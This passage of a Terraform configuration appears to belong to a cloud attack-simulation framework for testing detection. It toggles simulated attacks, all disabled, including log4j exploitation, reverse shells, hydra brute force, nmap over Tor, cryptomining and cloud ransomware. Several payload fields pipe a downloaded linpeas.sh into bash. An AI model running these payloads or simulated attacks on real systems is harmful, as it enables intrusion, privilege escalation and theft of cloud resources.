                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                reverse_shell               = false
                reverse_shell_port          = 0
                attack_delay                =  50400
              },
              docker_composite_compromised_credentials = {
                enabled                     = false
                compromised_credentials     = {}
                protonvpn_user              = null
                protonvpn_password          = null
                protonvpn_tier              = 0
                protonvpn_server            = "RANDOM"
                protonvpn_protocol          = "udp"
                protonvpn_privatekey        = null
                wallet                      = null
                minergate_user              = null
                nicehash_user               = null
                compromised_keys_user       = null
                attack_delay                =  50400
              },
              docker_composite_cloud_ransomware = {
                enabled                     = false
                compromised_credentials     = {}
                protonvpn_user              = null
                protonvpn_password          = null
                protonvpn_tier              = 0
                protonvpn_server            = "RANDOM"
                protonvpn_protocol          = "udp"
                protonvpn_privatekey        = null
                wallet                      = null
                minergate_user              = null
                nicehash_user               = null
                compromised_keys_user       = null
                attack_delay                =  50400
              },
              docker_composite_defense_evasion = {
                enabled                     = false
                compromised_credentials     = {}
                protonvpn_user              = null
                protonvpn_password          = null
                protonvpn_tier              = 0
                protonvpn_server            = "RANDOM"
                protonvpn_protocol          = "udp"
                protonvpn_privatekey        = null
                wallet                      = null
                minergate_user              = null
                nicehash_user               = null
                compromised_keys_user       = null
                attack_delay                =  50400
              },
              docker_composite_cloud_cryptomining = {
                enabled                     = false
                compromised_credentials     = {}
                protonvpn_user              = null
                protonvpn_password          = null
                protonvpn_tier              = 0
                protonvpn_server            = "RANDOM"
                protonvpn_protocol          = "udp"
                protonvpn_privatekey        = null
                wallet                      = null
                minergate_user              = null
                nicehash_user               = null
                compromised_keys_user       = null
                attack_delay                =  50400
              },
              docker_composite_host_cryptomining = {
                enabled                     = false
                compromised_credentials     = {}
                protonvpn_user              = null
                protonvpn_password          = null
                protonvpn_tier              = 0
                protonvpn_server            = "RANDOM"
                protonvpn_protocol          = "udp"
                protonvpn_privatekey        = null
                wallet                      = null
                minergate_user              = null
                nicehash_user               = null
                compromised_keys_user       = null
                attack_delay                =  50400
              },
              docker_composite_guardduty = {
                enabled                     = false
                attack_delay                =  50400
              },
              docker_composite_host_compromise = {
                enabled                     = false
                attack_delay                = 50400
              },
              docker_nmap = {
                enabled                     = false
                use_tor                     = true
                scan_local_network          = false
                targets                     = []
                ports                       = [22,80,443,1433,3306,5000,5432,5900,6379,8000,8080,8088,8090,8091,9200,27017]
                attack_delay                = 50400
              }
              docker_hydra = {
                enabled                     = false
                use_tor                     = true
                scan_local_network          = false
                targets                     = []
                custom_user_list            = []
                custom_password_list        = []
                user_list                   = "/opt/usernames/top-usernames-shortlist.txt"
                password_list               = "/opt/passwords/darkweb2017-top10.txt"
                attack_delay                = 50400
              }
              generate_web_traffic = {
                enabled                     = false
                delay                       = 60
                urls                        = []
              },
              generate_gcp_cli_traffic = {
                enabled                     = false
                compromised_credentials     = {}
                compromised_keys_user       = null
                profile                     = "gcp-traffic"
                commands                    = []
              }
            }
          }
        }
      }
      aws = {
        region                    = "us-east-1"
        profile_name              = null
        enabled                   = false
        ssm = {
          target = {
            drop = {
              malware = {
                eicar = { 
                  enabled                     = false
                  eicar_path                  = "/tmp/eicar"
                  eicar_win_path              = "C:\\eicar"
                }
              }
            }
            connect = {
              badip = {
                enabled                     = false
                iplist_url                  = "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/firehol_level2.netset"
                retry_delay_secs            = 1800
              }
              nmap_port_scan = {
                enabled                     = false
                nmap_scan_host              = "portquiz.net"
                nmap_scan_ports             = [80,443,23,22,8080,3389,27017,3306,6379,5432,389,636,1389,1636]
              }
              oast = {
                enabled                     = false
                retry_delay_secs            = 1800
              }
              codecov = {
                enabled                     = false
                use_ssl                     = false
                git_origin                  = "git@git.localhost:repo/repo.git"
                env_secrets                 = ["SECRET=supersecret123"]
                host_ip                     = null
                host_port                   = 8080
              }
              reverse_shell = {
                enabled                     = false
                host_ip                     = null
                host_port                   = 4444
                windows_host_port           = 4445
              }
            }
            listener = {
              port_forward = {
                enabled                     = false
                port_forwards               = [{
                                                src_port      = 1234
                                                dst_port      = 4444
                                                dst_ip        = "127.0.0.1"
                                                description   = "Example"
                                              }]
              }
            }
            execute = {
              docker_cpu_miner = {
                enabled                     = false
                minergate_name              = "xmrig"
                minergate_image             = "xmrig/xmrig"
                minergate_server            = "us-east.ethash-hub.miningpoolhub.com:20535"
                minergate_user              = "NOTAREALUSER"
                attack_delay                = 50400
              },
              cpu_miner = {
                enabled                     = false
                minergate_server            = "us-east.ethash-hub.miningpoolhub.com:20535"
                minergate_user              = "NOTAREALUSER"
                xmrig_version               = "6.5.3"
                attack_delay                = 50400
              },
              docker_nmap = {
                enabled                     = false
                use_tor                     = false
                scan_local_network          = true
                targets                     = []
                ports                       = [22,80,443,1433,3306,5000,5432,5900,6379,8000,8080,8088,8090,8091,9200,27017]
                attack_delay                = 50400
              }
              docker_hydra = {
                enabled                     = false
                use_tor                     = false
                scan_local_network          = true
                targets                     = []
                custom_user_list            = []
                custom_password_list        = []
                user_list                   = "/opt/usernames/top-usernames-shortlist.txt"
                password_list               = "/opt/passwords/darkweb2017-top10.txt"
                attack_delay                = 50400
              }
              generate_web_traffic = {
                enabled                     = false
                delay                       = 60
                urls                        = []
              },
              generate_aws_cli_traffic = {
                enabled                     = false
                compromised_credentials     = {}
                compromised_keys_user       = null
                profile                     = "aws-traffic"
                commands                    = [
                  "x=10",
                  "opts=\"--output json --color off --no-cli-pager\"",
                  "while [ $x -gt 0 ]; do ",
                  "log \"Running: aws sts get-caller-identity $opts\"",
                  "aws sts get-caller-identity $opts >> $LOGFILE 2>&1",
                  "log \"Running: aws iam list-users $opts\"",
                  "aws iam list-users $opts >> $LOGFILE 2>&1",
                  "log \"Running: aws s3api list-buckets $opts\"",
                  "aws s3api list-buckets $opts >> $LOGFILE 2>&1",
                  "log \"Running: aws ec2 describe-instances $opts\"",
                  "aws ec2 describe-instances $opts >> $LOGFILE 2>&1",
                  "log \"Running: aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts\"",
                  "aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts >> $LOGFILE 2>&1",
                  "log \"Running: aws ec2 describe-volumes $opts\"",
                  "aws ec2 describe-volumes $opts >> $LOGFILE 2>&1",
                  "log \"Running: aws ec2 describe-vpcs $opts\"",
                  "aws ec2 describe-vpcs $opts >> $LOGFILE 2>&1",
                  "x=$(($x-1))",
                  "done",
                ]
              }
            }
          }
          attacker = {
            connect = {
              ssh_shell_multistage = {
                enabled = false
                user_list = "/tmp/hydra-users.txt"
                password_list = "/tmp/hydra-passwords.txt"
                attack_delay = 50400
                payload = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                task = "custom"
                target_ip = null
                target_port = 22
                reverse_shell_host = null
                reverse_shell_port = 4444
              }
            }
            listener = {
              http = {
                enabled                     = false
                listen_ip                   = "0.0.0.0"
                listen_port                 = 8080
              }
            }
            responder = {
              reverse_shell = {
                enabled                     = false
                listen_ip                   = "0.0.0.0"
                listen_port                 = "4444"
                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
              }
              reverse_shell_multistage = {
                enabled                     = false
                listen_ip                   = "0.0.0.0"
                listen_port                 = "4444"
                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                windows_payload             = "if (Test-Path \"C:\\Windows\\Temp\\pwned.txt\") { (Get-Item \"C:\\Windows\\Temp\\pwned.txt\").LastWriteTime = Get-Date } else { New-Item -ItemType File -Path \"C:\\Windows\\Temp\\pwned.txt\" }"
                iam2rds_role_name           = "rds_user_access_role_ciemdemo"
                iam2rds_session_name        = "attacker-session"
                attack_delay                = 50400
                reverse_shell_host          = null
                windows_reverse_shell_port = 4445
              }
              port_forward = {
                enabled                     = false
                listen_port                 = 8888
              }
            }
            execute = {
              exploit_npm_app = {
                enabled                     = false
                target_ip                   = null
                target_port                 = 8089
                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                attack_delay                = 50400
              }
              exploit_authapp = {
                enabled                     = false
                target_ip                   = null
                target_port                 = 8000
                attack_delay                = 50400
                compromised_user_first_name = null
                compromised_user_last_name  = null
              }
              docker_exploit_log4j_app = {
                enabled                     = false
                attacker_http_port          = 8088
                attacker_ldap_port          = 1389
                attacker_ip                 = null
                target_ip                   = null
                target_port                 = null
                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                reverse_shell               = false
                reverse_shell_port          = 0
                attack_delay                =  50400
              },
              docker_composite_compromised_credentials = {
                enabled                     = false
                compromised_credentials     = {}
                protonvpn_user              = null
                protonvpn_password          = null
                protonvpn_tier              = 0
                protonvpn_server            = "RANDOM"
                protonvpn_protocol          = "udp"
                protonvpn_privatekey        = null
                wallet                      = null
                minergate_user              = null
                nicehash_user               = null
                compromised_keys_user       = null
                attack_delay                =  50400
              },
              docker_composite_cloud_ransomware = {
                enabled                     = false
                compromised_credentials     = {}
                protonvpn_user              = null
                protonvpn_password          = null
                protonvpn_tier              = 0
                protonvpn_server            = "RANDOM"
                protonvpn_protocol          = "udp"
                protonvpn_privatekey        = null
                wallet                      = null
                minergate_user              = null
                nicehash_user               = null
                compromised_keys_user       = null
                attack_delay                =  50400
              },
              docker_composite_defense_evasion = {
                enabled                     = false
                compromised_credentials     = {}
                protonvpn_user              = null
                protonvpn_password          = null
                protonvpn_tier              = 0
                protonvpn_server            = "RANDOM"
                protonvpn_protocol          = "udp"
                protonvpn_privatekey        = null
                wallet                      = null
                minergate_user              = null
                nicehash_user               = null
                compromised_keys_user       = null
                attack_delay                =  50400
              },
              docker_composite_cloud_cryptomining = {
                enabled                     = false
                compromised_credentials     = {}
                protonvpn_user              = null
                protonvpn_password          = null
                protonvpn_tier              = 0
                protonvpn_server            = "RANDOM"
                protonvpn_protocol          = "udp"
                protonvpn_privatekey        = null
                wallet                      = null
                minergate_user              = null
                nicehash_user               = null
                compromised_keys_user       = null
                attack_delay                =  50400
              },
              docker_composite_host_cryptomining = {
                enabled                     = false
                compromised_credentials     = {}
                protonvpn_user              = null
                protonvpn_password          = null
                protonvpn_tier              = 0
                protonvpn_server            = "RANDOM"
                protonvpn_protocol          = "udp"
                protonvpn_privatekey        = null
                wallet                      = null
                minergate_user              = null
                nicehash_user               = null
                compromised_keys_user       = null
                attack_delay                =  50400
              },
              docker_composite_guardduty = {
                enabled                     = false
                attack_delay                =  50400
              },
              docker_composite_host_compromise = {
                enabled                     = false
                attack_delay                = 50400
              },
              docker_nmap = {
                enabled                     = false
                use_tor                     = true
                scan_local_network          = false
                targets                     = []
                ports                       = [22,80,443,1433,3306,5000,5432,5900,6379,8000,8080,8088,8090,8091,9200,27017]
                attack_delay                = 50400
              }
              docker_hydra = {
                enabled                     = false
                use_tor                     = true
                scan_local_network          = false
                targets                     = []
                custom_user_list            = []
                custom_password_list        = []
                user_list                   = "/opt/usernames/top-usernames-shortlist.txt"
                password_list               = "/opt/passwords/darkweb2017-top10.txt"
                attack_delay                = 50400
              }
              generate_web_traffic = {
                enabled                     = false
                delay                       = 60
                urls                        = []
              },
              generate_aws_cli_traffic = {
                enabled                     = false
                compromised_credentials     = {}
                compromised_keys_user       = null
                profile                     = "aws-traffic"
                commands                    = [
                  "x=10",
                  "opts=\"--output json --color off --no-cli-pager\"",
                  "while [ $x -gt 0 ]; do ",
                  "log \"Running: aws sts get-caller-identity $opts\"",
                  "aws sts get-caller-identity $opts >> $LOGFILE 2>&1",
                  "log \"Running: aws iam list-users $opts\"",
                  "aws iam list-users $opts >> $LOGFILE 2>&1",
                  "log \"Running: aws s3api list-buckets $opts\"",
                  "aws s3api list-buckets $opts >> $LOGFILE 2>&1",
                  "log \"Running: aws ec2 describe-instances $opts\"",
                  "aws ec2 describe-instances $opts >> $LOGFILE 2>&1",
                  "log \"Running: aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts\"",
                  "aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts >> $LOGFILE 2>&1",
                  "log \"Running: aws ec2 describe-volumes $opts\"",
                  "aws ec2 describe-volumes $opts >> $LOGFILE 2>&1",
                  "log \"Running: aws ec2 describe-vpcs $opts\"",
                  "aws ec2 describe-vpcs $opts >> $LOGFILE 2>&1",
                  "x=$(($x-1))",
                  "done",
                ]
              }
            }
          }
        }
      }
    }
  }
}